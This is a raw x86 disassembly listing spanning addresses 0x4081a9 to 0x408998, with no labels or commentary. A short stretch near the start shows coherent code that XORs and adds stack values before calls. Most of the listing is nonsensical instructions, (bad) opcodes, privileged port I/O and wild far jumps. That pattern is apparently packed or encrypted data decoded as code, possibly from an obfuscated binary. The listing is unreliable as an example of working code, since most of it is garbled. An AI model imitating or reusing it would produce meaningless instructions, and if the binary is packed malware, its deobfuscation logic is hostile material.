  4081a9:	out    dx,al
  4081aa:	hlt    
  4081ab:	das    
  4081ac:	loope  0x4081f5
  4081ae:	int3   
  4081af:	or     edi,esi
  4081b1:	sub    DWORD PTR [ecx-0x557505b4],ebx
  4081b7:	mov    ah,0xb2
  4081b9:	sub    DWORD PTR [edi],0x6e5eb279
  4081bf:	push   0xe9c2179b
  4081c4:	bound  ecx,QWORD PTR [edx]
  4081c6:	retf   
  4081c7:	ds in  eax,0xe0
  4081ca:	test   ebp,eax
  4081cc:	js     0x40815d
  4081ce:	jmp    ebx
  4081d0:	pushf  
  4081d1:	mov    esi,0x458da864
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	xchg   esi,eax
  408269:	cmp    DWORD PTR [edi+eiz*4+0x7070d237],0x70707d20
  408274:	sub    al,ch
  408276:	addr16 jmp 0x408291
  408279:	rol    BYTE PTR [edx],cl
  40827b:	push   eax
  40827c:	inc    ebx
  40827d:	imul   ebx,DWORD PTR [eax-0x5b],0x14
  408281:	dec    eax
  408282:	xchg   esi,eax
  408283:	test   eax,0xe65ed6e6
  408288:	mov    ds:0x914b3e9f,al
  40828d:	or     bl,BYTE PTR [eax+ebp*4+0x79df3c78]
  408294:	lods   al,BYTE PTR ds:[esi]
  408295:	push   esp
  408296:	inc    esp
  408297:	ins    BYTE PTR es:[edi],dx
  408298:	idiv   DWORD PTR [edi+0x2d]
  40829b:	mov    ds:0xc29de132,al
  4082a0:	inc    edx
  4082a1:	jmp    0x408281
  4082a3:	xchg   edx,eax
  4082a4:	dec    esi
  4082a5:	loopne 0x40829e
  4082a7:	add    DWORD PTR [edi],esp
  4082a9:	cmp    DWORD PTR [ecx-0xceea03f],eax
  4082af:	add    dl,ch
  4082b1:	out    dx,eax
  4082b2:	xchg   edi,eax
  4082b3:	cmp    dl,BYTE PTR [edx]
  4082b5:	adc    al,0xb3
  4082b7:	sahf   
  4082b8:	xor    DWORD PTR [eax-0x46],ebp
  4082bb:	pop    ss
  4082bc:	out    dx,eax
  4082bd:	out    dx,eax
  4082be:	push   esi
  4082bf:	aaa    
  4082c0:	sbb    DWORD PTR [edx],esi
  4082c2:	mov    cl,0x73
  4082c4:	dec    ebp
  4082c5:	test   ecx,0xa0282b26
  4082cb:	jne    0x5b388e2e
  4082d1:	mov    dh,0x9b
  4082d3:	int    0x8f
  4082d5:	cli    
  4082d6:	das    
  4082d7:	pusha  
  4082d8:	xchg   ecx,eax
  4082d9:	push   0xe3ce119
  4082de:	jg     0x40830d
  4082e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e1:	(bad)  
  4082e2:	push   DWORD PTR [edx]
  4082e4:	mov    ch,0xe8
  4082e6:	js     0x408331
  4082e8:	mov    bh,0x4e
  4082ea:	sub    BYTE PTR [edx-0x6b],dl
  4082ed:	gs aaa 
  4082ef:	out    dx,al
  4082f0:	cmp    BYTE PTR [edi+0x10],ch
  4082f3:	je     0x4082f8
  4082f5:	mov    edx,0x3355a11b
  4082fa:	push   ebx
  4082fb:	fadd   QWORD PTR [eax+0x6f361e75]
  408301:	push   edi
  408302:	adc    BYTE PTR [edi+0x42],0x1c
  408306:	ret    
  408307:	(bad)  
  408309:	add    cl,dl
  40830b:	or     edx,DWORD PTR [ebp-0x5]
  40830e:	xchg   ecx,eax
  40830f:	fistp  DWORD PTR [edx+ebp*8]
  408312:	jno    0x408374
  408314:	lea    esp,[edi+0x5b05929d]
  40831a:	sub    DWORD PTR [ebx],ecx
  40831c:	out    0xc5,eax
  40831e:	inc    edi
  40831f:	cmc    
  408320:	imul   ebp,DWORD PTR [edx-0x17a89185],0xffffff84
  408327:	bound  edx,QWORD PTR [ecx+0x5a649d0]
  40832d:	push   cs
  40832e:	sbb    al,0x12
  408330:	inc    ebp
  408331:	add    eax,0x3c6eec2b
  408336:	xor    eax,0x45cbd459
  40833b:	call   0xae5c610a
  408340:	push   edi
  408341:	add    al,0xab
  408343:	xchg   BYTE PTR [ebx+edx*8-0x75],ah
  408347:	mov    al,ds:0xe240074b
  40834c:	add    cl,BYTE PTR [edx]
  40834e:	test   DWORD PTR [ebp-0x1c],ebp
  408351:	mov    al,ds:0x1e826135
  408356:	enter  0x29a9,0xe3
  40835a:	or     DWORD PTR [ecx+eax*4],eax
  40835d:	inc    esi
  40835e:	addr16 stc 
  408360:	enter  0x19ff,0xdd
  408364:	or     ah,BYTE PTR [eax]
  408366:	adc    WORD PTR [edi-0x463c4738],bx
  40836d:	cmc    
  40836e:	enter  0x655f,0x85
  408372:	add    BYTE PTR [edx],0x92
  408375:	cmp    al,0x2b
  408377:	cwde   
  408378:	out    0xf6,al
  40837a:	daa    
  40837b:	addr16 stc 
  40837d:	addr16 ds test al,0x5
  408381:	cmc    
  408382:	dec    esp
  408383:	imul   esp,DWORD PTR [edx],0xffffff82
  408386:	jecxz  0x40836a
  408388:	or     ah,dh
  40838a:	sbb    bh,BYTE PTR [ebx+0x23e9ba34]
  408390:	cmc    
  408391:	cs ins BYTE PTR es:[edi],dx
  408393:	enter  0xe191,0x7a
  408397:	retf   0xfc28
  40839a:	xchg   ebp,eax
  40839b:	std    
  40839c:	(bad)  
  40839d:	jmp    0x40835e
  40839f:	shl    DWORD PTR [edx-0x30],1
  4083a2:	jne    0x408370
  4083a4:	push   ecx
  4083a5:	add    ch,0xd3
  4083a8:	push   es
  4083a9:	add    DWORD PTR [eax+0x5231e4d8],0xb02cb922
  4083b3:	ds mov eax,0xcdfaa76a
  4083b9:	lea    esp,[esi]
  4083bb:	xchg   edi,eax
  4083bc:	inc    edx
  4083bd:	jno    0x408355
  4083bf:	test   al,0x65
  4083c1:	inc    ebp
  4083c2:	(bad)  
  4083c3:	jmp    0xb7894fea
  4083c8:	mov    esi,0x5a69b52a
  4083cd:	dec    ebx
  4083ce:	dec    edi
  4083cf:	ds push ds
  4083d1:	in     eax,0x1e
  4083d3:	xlat   BYTE PTR ds:[ebx]
  4083d4:	push   ebx
  4083d5:	xchg   ebp,eax
  4083d6:	xchg   ebp,eax
  4083d7:	rcl    DWORD PTR [ebp+ecx*1+0x461df459],0x45
  4083df:	rcr    ebp,1
  4083e1:	les    edi,FWORD PTR [edx+0x1a8222b8]
  4083e7:	je     0x408454
  4083e9:	call   DWORD PTR [esi]
  4083eb:	pop    ecx
  4083ec:	rcl    BYTE PTR [ebp-0x4c83aef5],1
  4083f2:	push   0x99d9f79a
  4083f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f8:	or     al,0x61
  4083fa:	popa   
  4083fb:	fmul   QWORD PTR [ecx+0x692c56e7]
  408401:	and    eax,0x6e1d5a63
  408406:	dec    eax
  408407:	lock sti 
  408409:	js     0x408441
  40840b:	aaa    
  40840c:	pop    ds
  40840d:	out    dx,al
  40840e:	jnp    0x40847e
  408410:	cmp    ebp,DWORD PTR [edx+0x6f1357c4]
  408416:	retf   
  408417:	adc    al,0xd8
  408419:	inc    ebx
  40841a:	push   edx
  40841b:	int    0x68
  40841d:	cli    
  40841e:	cmc    
  40841f:	aam    0x94
  408421:	cli    
  408422:	out    0xdc,eax
  408424:	xchg   DWORD PTR [eax-0x3b8c3c1a],edx
  40842a:	jns    0x408430
  40842c:	mov    ebp,0x4bb599ad
  408431:	xor    ecx,esp
  408433:	jbe    0x4083f1
  408435:	out    dx,eax
  408436:	jmp    0xcd9de16a
  40843b:	pop    ebp
  40843c:	repnz dec esp
  40843e:	lahf   
  40843f:	ret    0x794f
  408442:	inc    ebx
  408443:	inc    DWORD PTR ds:0x6efc9ed2
  408449:	add    esp,ebx
  40844b:	sti    
  40844c:	sahf   
  40844d:	fild   QWORD PTR [edi]
  40844f:	sbb    al,0x44
  408451:	jo     0x408469
  408453:	xchg   ecx,eax
  408454:	aad    0xc6
  408456:	add    esp,DWORD PTR [edi-0x2c]
  408459:	into   
  40845a:	push   0x4f0dff1c
  40845f:	sub    al,0x40
  408461:	push   ss
  408462:	adc    eax,0x3ba461de
  408467:	stos   BYTE PTR es:[edi],al
  408468:	in     al,dx
  408469:	aam    0xdd
  40846b:	add    bh,BYTE PTR [ebx-0x506e2185]
  408471:	dec    esp
  408472:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408474:	shl    DWORD PTR [ebp-0x37d49143],cl
  40847a:	lock mov ebp,esi
  40847d:	push   ss
  40847e:	mov    dl,0xb4
  408480:	sbb    dl,dl
  408482:	in     eax,dx
  408483:	jge    0x40847b
  408485:	mov    eax,ds:0x4b336da8
  40848a:	mov    dh,0x7f
  40848c:	jo     0x408458
  40848e:	imul   esp,DWORD PTR [ebx],0xdabf2150
  408494:	mov    ah,0xcd
  408496:	out    0xac,eax
  408498:	jns    0x4084a6
  40849a:	pop    ecx
  40849b:	push   eax
  40849c:	icebp  
  40849d:	test   BYTE PTR [ecx+0x4c],ah
  4084a0:	add    edi,DWORD PTR [esp+ecx*1-0x63]
  4084a4:	mov    bh,0x9c
  4084a6:	lods   eax,DWORD PTR ds:[esi]
  4084a7:	mov    BYTE PTR [esi],dl
  4084a9:	or     cl,ah
  4084ab:	add    al,0xb4
  4084ad:	scas   al,BYTE PTR es:[edi]
  4084ae:	pop    esp
  4084af:	pop    ecx
  4084b0:	out    dx,al
  4084b1:	xlat   BYTE PTR ds:[ebx]
  4084b2:	mov    edx,0xe4c7b743
  4084b7:	rcl    BYTE PTR [edx-0x72],cl
  4084ba:	cld    
  4084bb:	std    
  4084bc:	retf   0xcdb3
  4084bf:	ret    
  4084c0:	addr16 push cs
  4084c2:	fcom   st(1)
  4084c4:	xchg   edi,eax
  4084c5:	adc    DWORD PTR [ebx+0x3f1990d3],ecx
  4084cb:	repnz inc ecx
  4084cd:	sub    eax,0x7d5700a
  4084d2:	add    al,0xee
  4084d4:	push   ebp
  4084d5:	jne    0x408551
  4084d7:	jg     0x4084fa
  4084d9:	fsub   DWORD PTR [edi]
  4084db:	test   al,0xb9
  4084dd:	mov    ebp,0x2c471b45
  4084e2:	test   DWORD PTR [ebx-0x3541101f],0xd9829612
  4084ec:	je     0x408483
  4084ee:	adc    esi,DWORD PTR [esp+edi*8+0x3b]
  4084f2:	std    
  4084f3:	cmp    eax,0xe9437b5d
  4084f8:	test   DWORD PTR [edx+0x15],0x99053b82
  4084ff:	popf   
  408500:	test   eax,0xb095026c
  408505:	xor    DWORD PTR [ebx],esi
  408507:	and    bh,BYTE PTR [ebx-0x38d68be0]
  40850d:	mov    BYTE PTR [edi+0x875f6cf],bl
  408513:	adc    eax,0xdd231165
  408518:	inc    ebp
  408519:	sbb    al,BYTE PTR [ebx+0x7f402e7]
  40851f:	mov    bl,0x2f
  408521:	pop    ebp
  408522:	fiadd  WORD PTR [ebx+0x45bc9c9a]
  408528:	pop    edi
  408529:	mov    dl,ch
  40852b:	mov    ebp,0xc5dafe12
  408530:	dec    edi
  408531:	mov    dl,0x77
  408533:	cmp    BYTE PTR [edx+ebp*2],bl
  408536:	add    dl,BYTE PTR [ecx-0x2fe9feb8]
  40853c:	cmp    DWORD PTR [esi],edi
  40853e:	call   FWORD PTR [edi+0x3]
  408541:	mov    ecx,esi
  408543:	push   esi
  408544:	cmp    al,0xe8
  408546:	pop    ds
  408547:	leave  
  408548:	jmp    ebp
  40854a:	pusha  
  40854b:	push   0x18f7e9b2
  408550:	sahf   
  408551:	lahf   
  408552:	sub    ah,BYTE PTR ss:[esi-0x77]
  408556:	retf   
  408557:	push   eax
  408558:	jecxz  0x40858a
  40855a:	lock pop ebx
  40855c:	inc    ecx
  40855d:	arpl   WORD PTR [edx],di
  40855f:	jmp    0x1d33:0xa8e3ec7d
  408566:	in     al,0x49
  408568:	ss xchg edx,eax
  40856a:	xchg   esp,eax
  40856b:	in     eax,0x8
  40856d:	dec    eax
  40856e:	push   0xfffffff0
  408570:	adc    BYTE PTR [edx+0x1a0b5023],bh
  408576:	pushf  
  408577:	inc    ebp
  408578:	mov    edi,0xe9395fa7
  40857d:	fdivp  st(6),st
  40857f:	cld    
  408580:	fsubr  QWORD PTR [edi+0x69fb862]
  408586:	mov    ebp,0xb53b5387
  40858b:	add    BYTE PTR [ebp-0x6a],bh
  40858e:	fadd   DWORD PTR [edi-0x10]
  408591:	dec    eax
  408592:	push   ss
  408593:	std    
  408594:	daa    
  408595:	loop   0x408556
  408597:	not    BYTE PTR [ebx-0x77f5bb1e]
  40859d:	jle    0x4085fe
  40859f:	imul   edi,DWORD PTR [esi-0x773a2e06],0x1
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xbcca2d8d
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085f6
  4085c4:	pushf  
  4085c5:	sbb    al,0x91
  4085c7:	aad    0x96
  4085c9:	ror    BYTE PTR [eax],1
  4085cb:	pop    esi
  4085cc:	jecxz  0x40855e
  4085ce:	pop    eax
  4085cf:	cmp    DWORD PTR [ebx+0x77340c50],ebx
  4085d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085d6:	jne    0x4085a7
  4085d8:	sub    edi,DWORD PTR [edx]
  4085da:	out    dx,al
  4085db:	leave  
  4085dc:	fild   DWORD PTR [edi+0x17496c48]
  4085e2:	(bad)  
  4085e3:	test   dl,dh
  4085e5:	or     DWORD PTR [ebp-0x70],0xffffffd0
  4085e9:	imul   edx,DWORD PTR [esi-0x6a548b14],0xffffffb0
  4085f0:	sahf   
  4085f1:	mov    ebp,DWORD PTR [esi-0x52471566]
  4085f7:	cmp    BYTE PTR [ecx],cl
  4085f9:	stos   BYTE PTR es:[edi],al
  4085fa:	xor    al,0x58
  4085fc:	out    0xc8,eax
  4085fe:	loop   0x408586
  408600:	fisubr DWORD PTR [ecx-0x1d]
  408603:	sbb    BYTE PTR [eax+eax*4-0x13570c08],al
  40860a:	fistp  QWORD PTR [edi-0xb565c67]
  408610:	pop    es
  408611:	pop    ss
  408612:	dec    ebp
  408613:	int    0x2e
  408615:	inc    ecx
  408616:	mov    gs,WORD PTR [esi+0x3e3404d7]
  40861c:	push   esp
  40861d:	sub    al,0x43
  40861f:	(bad)  
  408620:	mov    ah,0xbd
  408622:	retf   0x7711
  408625:	inc    edi
  408626:	or     al,0x9f
  408628:	add    al,0x49
  40862a:	ret    0xe175
  40862d:	sub    ecx,edx
  40862f:	sbb    ebp,DWORD PTR [edx+0x45330153]
  408635:	cmp    bh,BYTE PTR [eax+eax*1]
  408638:	leave  
  408639:	add    BYTE PTR [ecx],0xf4
  40863c:	xchg   edi,eax
  40863d:	test   cl,dl
  40863f:	cmp    eax,0x605e00b
  408644:	add    dh,BYTE PTR [ebp-0x51]
  408647:	daa    
  408648:	ds inc ebx
  40864a:	(bad)
  40864d:	pop    ecx
  40864e:	les    esi,FWORD PTR [edx+0x2a]
  408651:	xor    esp,DWORD PTR [edx]
  408653:	mov    ebp,DWORD PTR [edx]
  408655:	pop    es
  408656:	sbb    eax,0xd3bba607
  40865b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40865c:	mov    edx,0xb17b9750
  408661:	in     eax,dx
  408662:	mov    ecx,0x36cb32ff
  408667:	enter  0x1370,0x6d
  40866b:	adc    al,0x3f
  40866d:	mov    bl,0xef
  40866f:	data16 and bl,dh
  408672:	xor    BYTE PTR [edi+eax*2],cl
  408675:	clc    
  408676:	pop    esi
  408677:	push   ebx
  408678:	pop    eax
  408679:	out    0x20,eax
  40867b:	jae    0x408620
  40867d:	xchg   BYTE PTR [edx+0x30],cl
  408680:	sub    al,0x3c
  408682:	hlt    
  408683:	fld    DWORD PTR [ebx]
  408685:	jg     0x40863a
  408687:	aam    0x66
  408689:	mov    eax,ds:0xf512cad5
  40868e:	std    
  40868f:	rcr    DWORD PTR [edx+0x6b],1
  408692:	or     BYTE PTR [edi+eiz*8-0x62],0x1f
  408697:	cdq    
  408698:	test   eax,0xbfc812ba
  40869d:	in     al,dx
  40869e:	cmp    cl,BYTE PTR [ebp-0x6d]
  4086a1:	cmp    dh,dh
  4086a3:	dec    esp
  4086a4:	xlat   BYTE PTR ds:[ebx]
  4086a5:	sbb    eax,0x3bc14e61
  4086aa:	jne    0x408713
  4086ac:	loopne 0x4086a8
  4086ae:	mov    al,0x64
  4086b0:	mov    ah,0xee
  4086b2:	or     BYTE PTR [eax+0x3c6129c1],bl
  4086b8:	mov    esp,0x8607be0f
  4086bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086be:	cdq    
  4086bf:	or     esp,esp
  4086c1:	and    eax,DWORD PTR [ebx-0x7b]
  4086c4:	xchg   DWORD PTR [eax],esi
  4086c6:	xor    esi,DWORD PTR [edx-0x5eeeb01e]
  4086cc:	scas   eax,DWORD PTR es:[edi]
  4086cd:	ret    
  4086ce:	aas    
  4086cf:	mov    dl,0xe5
  4086d1:	jb     0x408706
  4086d3:	dec    edi
  4086d4:	in     al,0x28
  4086d6:	ret    0xdaa1
  4086d9:	xor    al,0xe4
  4086db:	mov    esi,0x287dde3b
  4086e0:	jbe    0x4086be
  4086e2:	adc    esp,DWORD PTR [esi+esi*2+0x68]
  4086e6:	mov    DWORD PTR ds:0x8a986c74,ebp
  4086ec:	leave  
  4086ed:	xor    eax,0xdf685a9b
  4086f2:	bound  esi,QWORD PTR [edi]
  4086f4:	jmp    0x5e7f:0xd1ab9094
  4086fb:	cs lahf 
  4086fd:	hlt    
  4086fe:	and    BYTE PTR [edx+0x15],ah
  408701:	aam    0xb3
  408703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408704:	jnp    0x408734
  408706:	push   esp
  408707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408708:	test   BYTE PTR [ebx-0x4d],bl
  40870b:	adc    bh,BYTE PTR [ebx-0x1d]
  40870e:	push   ecx
  40870f:	jb     0x408788
  408711:	arpl   bp,di
  408713:	inc    esp
  408714:	dec    eax
  408715:	add    DWORD PTR [edi],ebx
  408717:	mov    al,0x48
  408719:	xchg   edx,eax
  40871a:	cmc    
  40871b:	push   es
  40871c:	add    BYTE PTR [edx+ebx*1+0x5b],0x40
  408721:	dec    edx
  408722:	push   ds
  408723:	aas    
  408724:	pop    eax
  408725:	int    0xaa
  408727:	mov    ecx,0x8f8727ea
  40872c:	and    eax,DWORD PTR [edi+0x4746a299]
  408732:	outs   dx,BYTE PTR ds:[esi]
  408733:	in     al,0x64
  408735:	or     al,0x2d
  408737:	retf   
  408738:	mov    cl,0xfd
  40873a:	out    dx,al
  40873b:	jo     0x40878f
  40873d:	stos   BYTE PTR es:[edi],al
  40873e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873f:	mov    eax,edx
  408741:	jp     0x4086fc
  408743:	mov    dh,0xf8
  408745:	jmp    0x4a579353
  40874a:	retf   
  40874b:	dec    esi
  40874c:	cmp    DWORD PTR [ebp-0x57bb818c],ebx
  408752:	pop    ecx
  408753:	mov    ebx,0xa9c7753d
  408758:	repnz push eax
  40875a:	inc    ebx
  40875b:	xor    dl,0xc8
  40875e:	xchg   ebx,eax
  40875f:	inc    ebp
  408760:	cmc    
  408761:	mov    ch,BYTE PTR [ebx-0x45518032]
  408767:	sbb    al,0x13
  408769:	push   es
  40876a:	stos   DWORD PTR es:[edi],eax
  40876b:	xchg   ebp,eax
  40876c:	inc    ebx
  40876d:	mov    dh,0xdf
  40876f:	test   eax,0x123c1e59
  408774:	or     al,BYTE PTR [ebx+eax*2+0x4f462791]
  40877b:	mov    esi,0x6decfce8
  408780:	xlat   BYTE PTR ds:[ebx]
  408781:	pusha  
  408782:	int3   
  408783:	inc    esi
  408784:	cmp    dh,BYTE PTR [eax]
  408786:	push   0x5a
  408788:	xchg   bl,ah
  40878a:	xor    cl,BYTE PTR gs:0x289659a6
  408791:	jo     0x40873d
  408793:	mov    bh,0xcf
  408795:	jae    0x40874d
  408797:	sbb    eax,0x38b1c3a1
  40879c:	xchg   edx,eax
  40879d:	xchg   BYTE PTR [eax-0xa],al
  4087a0:	stos   DWORD PTR es:[edi],eax
  4087a1:	adc    eax,0xc49fb011
  4087a6:	sbb    al,0x91
  4087a8:	test   eax,0xa1598e81
  4087ad:	leave  
  4087ae:	dec    ecx
  4087af:	leave  
  4087b0:	push   ebx
  4087b1:	inc    ebx
  4087b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b3:	sbb    ebp,DWORD PTR [ebp+esi*2+0xb382d88]
  4087ba:	jno    0x4087ac
  4087bc:	push   edi
  4087bd:	mov    ?,WORD PTR gs:[eax]
  4087c0:	call   0x4b3d:0x1b4ccb43
  4087c7:	xchg   DWORD PTR [edx-0x66],eax
  4087ca:	xor    cl,al
  4087cc:	icebp  
  4087cd:	aaa    
  4087ce:	push   es
  4087cf:	xor    al,0xd8
  4087d1:	sbb    edi,DWORD PTR [esi]
  4087d3:	nop
  4087d4:	sbb    al,0x13
  4087d6:	pop    ss
  4087d7:	adc    al,cl
  4087d9:	add    BYTE PTR [eax+0x4aa11f66],cl
  4087df:	dec    edx
  4087e0:	rol    BYTE PTR [esi+esi*1-0x4d],0xad
  4087e5:	add    ch,bl
  4087e7:	sub    BYTE PTR [edx],bh
  4087e9:	fwait
  4087ea:	sbb    DWORD PTR [esi],ebx
  4087ec:	retf   0x8925
  4087ef:	and    ch,BYTE PTR [ebx]
  4087f1:	push   ecx
  4087f2:	in     eax,dx
  4087f3:	cmp    DWORD PTR ds:0xc720b936,0x731e13e8
  4087fd:	(bad)  
  4087ff:	sar    BYTE PTR [ebx],0xf7
  408802:	fwait
  408803:	xor    edi,DWORD PTR ds:0x4797ca73
  408809:	(bad)  
  40880a:	xor    eax,0xc50a1f55
  40880f:	mov    cl,0xd7
  408811:	cmp    dh,BYTE PTR [eax+0x65277fbe]
  408817:	cmp    ch,al
  408819:	jle    0x4087d3
  40881b:	lock jno 0x408873
  40881e:	xor    edi,DWORD PTR [esi]
  408820:	push   ecx
  408821:	hlt    
  408822:	daa    
  408823:	xchg   edx,eax
  408824:	sysret 
  408826:	jb     0x408869
  408828:	inc    ebx
  408829:	or     eax,0x712b2b60
  40882e:	xor    eax,0x369e909f
  408833:	into   
  408834:	push   ds
  408835:	not    ebx
  408837:	pop    bx
  408839:	mov    bl,0xc6
  40883b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883c:	cdq    
  40883d:	xchg   bh,ah
  40883f:	inc    edi
  408840:	ins    BYTE PTR es:[edi],dx
  408841:	dec    eax
  408842:	mov    DWORD PTR [ecx-0x5f],edx
  408845:	jne    0x4087cc
  408847:	es js  0x4087e3
  40884a:	iret   
  40884b:	and    al,ch
  40884d:	cli    
  40884e:	(bad)  
  40884f:	dec    esi
  408850:	jne    0x4087df
  408852:	sahf   
  408853:	shl    DWORD PTR [ecx],0xee
  408856:	push   ds
  408857:	loopne 0x408872
  408859:	xor    esi,DWORD PTR [ebp-0x74c6231a]
  40885f:	sbb    ebx,DWORD PTR [edx+0x492c753c]
  408865:	xlat   BYTE PTR ds:[ebx]
  408866:	retf   0x373d
  408869:	aaa    
  40886a:	mov    BYTE PTR [ecx],dl
  40886c:	fs shr dl,1
  40886f:	or     BYTE PTR [esi+0x4d4743e9],dl
  408875:	xchg   edx,eax
  408876:	aas    
  408877:	das    
  408878:	jae    0x4088b5
  40887a:	dec    esp
  40887b:	mov    bh,0x9
  40887d:	xor    BYTE PTR ds:[ecx+edx*4+0x12],0x20
  408883:	add    ah,0x37
  408886:	xor    DWORD PTR [eax-0x3a],edx
  408889:	add    al,0x85
  40888b:	ins    DWORD PTR es:[edi],dx
  40888c:	or     eax,0x9f2d06a5
  408891:	imul   ecx,DWORD PTR [ebx-0x26f79c39],0xffffffdd
  408898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408899:	out    dx,al
  40889a:	aas    
  40889b:	or     esi,esp
  40889d:	mov    ecx,0xef053ad
  4088a2:	pop    es
  4088a3:	daa    
  4088a4:	sub    dh,al
  4088a6:	icebp  
  4088a7:	sub    BYTE PTR [edx+0x6495f8b0],bh
  4088ad:	dec    esi
  4088ae:	adc    eax,0x46782b70
  4088b3:	cmp    dh,BYTE PTR [esp+ebp*1+0xf]
  4088b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b8:	or     eax,0xd57fa6a1
  4088bd:	ret    
  4088be:	inc    eax
  4088bf:	push   ds
  4088c0:	or     al,0x8
  4088c2:	dec    edx
  4088c3:	repnz push es
  4088c5:	mov    BYTE PTR [eax+0x1b4edecc],ch
  4088cb:	inc    ebp
  4088cc:	dec    ecx
  4088cd:	pop    ecx
  4088ce:	sahf   
  4088cf:	arpl   WORD PTR [eax+ecx*1-0x309feed6],bp
  4088d6:	push   eax
  4088d7:	mov    ebx,DWORD PTR [edi]
  4088d9:	ja     0x40891e
  4088db:	mov    eax,ds:0x83c775f5
  4088e0:	push   eax
  4088e2:	pop    DWORD PTR ds:0xb83dce4e
  4088e8:	push   es
  4088e9:	imul   esi,DWORD PTR ds:0x148f9897,0xffffff86
  4088f0:	mov    ebx,0x458d6688
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x25435cff],cl
  40890c:	ins    DWORD PTR es:[edi],dx
  40890d:	pop    eax
  40890e:	hlt    
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x40896f
  408918:	pop    edx
  408919:	ins    BYTE PTR es:[edi],dx
  40891a:	jnp    0x408901
  40891c:	mov    edx,0x82cc5c63
  408921:	fcom   QWORD PTR [ebp-0x7a]
  408924:	mov    ch,0x68
  408926:	sbb    BYTE PTR [ebp-0x5c],ch
  408929:	fisttp QWORD PTR ds:0xd23b3128
  40892f:	xchg   edi,eax
  408930:	jns    0x408977
  408932:	cld    
  408933:	pushf  
  408934:	adc    ax,sp
  408937:	sub    eax,0x38e2d6f6
  40893c:	fnstenv [eax-0x31b2679c]
  408942:	jbe    0x408998
  408944:	mov    ecx,0x7a9bffbf
  408949:	stos   BYTE PTR es:[edi],al
  40894a:	pop    ecx
  40894b:	mov    al,ds:0x468b2fe0
  408950:	mov    eax,ds:0x4d45cbf
  408955:	xlat   BYTE PTR ds:[ebx]
  408956:	aaa    
  408957:	mov    WORD PTR [edx+0x55ea1c4e],fs
  40895d:	lahf   
  40895e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  408960:	pusha  
  408961:	sbb    eax,0x627a8a63
  408966:	inc    ecx
  408967:	enter  0x5f54,0x8
  40896b:	sub    BYTE PTR [edi],bl
  40896d:	fisub  DWORD PTR [eax+0x2e8cdaa1]
  408973:	inc    ebx
  408974:	cmc    
  408975:	mov    BYTE PTR [eax-0x506a2f3e],cl
  40897b:	mov    BYTE PTR [edi-0x5613801b],ch
  408981:	into   
  408982:	mov    BYTE PTR [ebx],bh
  408984:	scas   eax,DWORD PTR es:[edi]
  408985:	fst    st(6)
  408987:	pop    esi
  408988:	jae    0x4089bf
  40898a:	jp     0x4089ac
  40898c:	ins    BYTE PTR es:[edi],dx
  40898d:	jle    0x4089e7
  40898f:	lahf   
  408990:	sbb    DWORD PTR [ecx+0x7b],ebx
  408993:	pop    esp
  408994:	stos   DWORD PTR es:[edi],eax
  408995:	pop    edx
  408996:	lock inc esp
  408998:	adc    DWORD PTR [eax+eax*4+0x46a802bb],esi
